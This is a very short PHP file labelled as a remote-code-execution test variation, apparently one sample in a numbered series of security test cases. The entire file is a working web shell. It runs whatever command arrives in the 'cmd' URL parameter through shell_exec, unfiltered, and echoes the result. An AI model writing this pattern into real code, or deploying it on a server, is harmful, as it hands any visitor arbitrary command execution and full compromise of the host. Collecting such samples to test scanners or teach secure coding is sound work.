<?php
// RCE test variation #435
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>